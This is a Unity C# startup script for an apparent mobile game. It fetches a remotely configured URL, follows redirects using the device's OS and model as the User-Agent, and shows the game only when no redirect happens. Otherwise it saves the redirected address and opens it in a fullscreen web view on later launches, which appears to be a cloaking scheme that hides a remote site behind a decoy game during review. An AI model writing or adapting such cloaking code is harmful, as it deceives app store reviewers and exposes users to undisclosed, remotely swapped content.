using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.UI;

public class AppStartup : MonoBehaviour
{
    [SerializeField] private FirebaseHandler firebaseHandler;

    [SerializeField] private Text statusText;

    [SerializeField] private GameObject gameRoot; //game

    public static string PrivacyUrl;
    private const string localUrlKey = "Local-Url";

    IEnumerator Start()
    {
        RequestPermissionForNotifications();

        string url = PlayerPrefs.GetString(localUrlKey, "null");
        if (url == "null")
        {
            bool ready = false;
            bool isFirebaseReady = false;

            try
            {
                firebaseHandler.Initialize((success) => { ready = true; isFirebaseReady = success; });
            }
            catch (Exception ex)
            {
                statusText.text = ex.Message;
            }
            yield return new WaitUntil(() => ready);

            ready = false;

            Task result = firebaseHandler.FetchDataAsync();
            yield return new WaitUntil(() => result.IsCompleted);

            //Get data
            url = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("asit").StringValue;

            var res = GetRedirectedUrlInfoAsync(new Uri(url));
            float delay = 9f;
            while (!res.IsCompleted && delay > 0f)
            {
                yield return new WaitForSeconds(Time.deltaTime);
                delay -= Time.deltaTime;
            }

            yield return null;
            //CHECK
            if (!res.IsCompleted || res.IsFaulted) OpenGame();

            yield return null;

            if (res.Result.RequestMessage.RequestUri.AbsoluteUri == url)
            {
                PrivacyUrl = url;
                OpenGame();
            }
            else //normal device
            {
                PlayerPrefs.SetString(localUrlKey, res.Result.RequestMessage.RequestUri.AbsoluteUri);
                OpenView(res.Result.RequestMessage.RequestUri.AbsoluteUri);
            }
        }
        else if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            OpenGame();
        }
        else
        {
            OpenView(url);
        }
    }

    void OpenGame()
    {
        StopAllCoroutines();
        gameRoot.SetActive(true);
    }

    #region web
    void OpenView(string url)
    {
        try
        {
            UniWebView webView = gameObject.AddComponent<UniWebView>();
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            webView.OnOrientationChanged += (view, orientation) =>
            {
                StartCoroutine(ResizeWebview(webView));
            };

            webView.Show();
            webView.OnMultipleWindowOpened += (view, id) => { webView.Load(view.Url); };
            webView.SetSupportMultipleWindows(true, true);
            webView.OnShouldClose += (view) => { return view.CanGoBack; };
            webView.Load(url);
        }
        catch (Exception ex)
        {
            statusText.text += $"\n {ex}";
        }
    }

    IEnumerator ResizeWebview(UniWebView view)
    {
        yield return new WaitForSeconds(Time.deltaTime * 2);
        view.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }

    #endregion

    void RequestPermissionForNotifications()
    {
        AndroidJavaClass androidVersion = new AndroidJavaClass("android.os.Build$VERSION");
        int sdkInt = androidVersion.GetStatic<int>("SDK_INT");
        Debug.Log($"Andoid sdk is {sdkInt}");
        if (sdkInt >= 33)
        {
            AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject currentActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
            currentActivity.Call("requestPermissions", new string[] { "android.permission.RECEIVE_BOOT_COMPLETED" }, 1);
            UnityEngine.Android.Permission.RequestUserPermission("android.permission.POST_NOTIFICATIONS");
        }
    }

    public static string UserAgentKey = "User-Agent";
    public static string[] UserAgentValue => new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel };

    public static async Task<System.Net.Http.HttpResponseMessage> GetRedirectedUrlInfoAsync(Uri uri, System.Threading.CancellationToken cancellationToken = default)
    {
        using var client = new System.Net.Http.HttpClient(new System.Net.Http.HttpClientHandler
        {
            AllowAutoRedirect = true,
        }, true);
        client.DefaultRequestHeaders.Add(UserAgentKey, UserAgentValue);

        using var response = await client.GetAsync(uri, cancellationToken);

        return response;
    }


}
